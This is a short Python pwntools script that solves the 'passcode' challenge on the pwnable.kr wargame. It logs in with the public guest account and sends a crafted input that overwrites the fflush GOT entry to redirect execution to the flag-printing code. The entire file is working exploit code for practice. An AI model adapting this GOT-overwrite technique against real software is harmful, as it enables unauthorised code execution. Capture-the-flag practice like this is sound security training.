import pwn

io = pwn.ssh(
    host='pwnable.kr',
    port=2222,
    user='passcode',
    password='guest'
)

# e_file = io.download_file('passcode')
e = pwn.ELF('./passcode')

io = io.run('./passcode')

fflush_got_plt = e.symbols['got.fflush']
goal_addr = 0x80485d7

name = b'A' * 96 + pwn.p32(fflush_got_plt)
print(name)

p1 = str(goal_addr).encode()
print(p1)

# with open('access', 'wb') as f:
#     f.write(name)
#     f.write(p1)
#     f.write(p2)

io.sendline(name)
io.sendline(p1)
print(io.recvall().decode(errors='ignore'))
